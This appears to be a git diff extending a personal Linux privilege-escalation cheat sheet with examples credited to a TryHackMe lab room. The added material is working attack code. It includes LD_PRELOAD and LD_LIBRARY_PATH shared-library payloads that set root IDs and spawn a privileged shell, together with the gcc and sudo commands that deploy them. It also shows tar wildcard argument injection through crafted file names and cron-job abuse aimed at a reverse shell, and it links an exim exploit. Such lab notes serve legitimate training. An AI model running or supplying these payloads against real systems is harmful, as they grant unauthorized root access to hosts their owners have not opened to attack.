@@ -492,7 +492,7 @@ sudo -u#-1 /bin/bash
 ### [Escaping Docker Container]
 https://medium.com/better-programming/escaping-docker-privileged-containers-a7ae7d17f5a1
 
-### [Creating a LD_PRELOAD and suid bin]
+### [Creating a LD_PRELOAD and suid bin] Examples taken from -> https://tryhackme.com/room/linuxprivesc
 
 ```
 #include <stdio.h>
@@ -511,6 +511,43 @@ print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.
 gcc -o /tmp/suid /tmp/suid.c  
 sudo chmod +x /tmp/suid
 sudo chmod +s /tmp/suid
+
+
+privilege escalation via sudo LD_PRELOAD
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+	unsetenv("LD_PRELOAD");
+	setresuid(0,0,0);
+	system("/bin/bash -p");
+}
+
+sudo LD_PRELOAD=/tmp/preload.so program-name-here
+```
+
+### [Creating a LD_LIBRARY_PATH and suid bin] Examples taken from -> https://tryhackme.com/room/linuxprivesc
+```
+privilege escalation via sudo LD_LIBRARY_PATH
+
+#include <stdio.h>
+#include <stdlib.h>
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+	unsetenv("LD_LIBRARY_PATH");
+	setresuid(0,0,0);
+	system("/bin/bash -p");
+}
+
+ldd /usr/sbin/apache2
+
+gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+
+sudo LD_LIBRARY_PATH=/tmp apache2
 ```
 
 ### [Sudo inject]
@@ -690,3 +727,23 @@ sudo yum localinstall -y root-1.0-1.noarch.rpm
 1. Use `git log` to view git log history to view the commit ids  
 2. Then you can utilize `git log -p -1` `git log -p -2`... etc to view the content within each commit.  
 
+### Abusing cron jobs Examples taken from -> https://tryhackme.com/room/linuxprivesc
+```
+Abusing cron jobs
+
+1. If you find a cronjob that calls a script without a path then it is vulnerable to PATH abuse.
+2. If you are able to modify the script which is owned by root then modify the script so that you are able to trigger the cron job at the configured time. Objective is to hopefully execute a reverse shell.
+
+Wild cards inside of cronjobs
+
+#!/bin/sh
+cd /home/user
+tar czf /tmp/backup.tar.gz *
+
+touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=payload_file
+```
+
+### exploiting exim-4.84-3 Examples taken from -> https://tryhackme.com/room/linuxprivesc
+
+https://www.exploit-db.com/exploits/39535
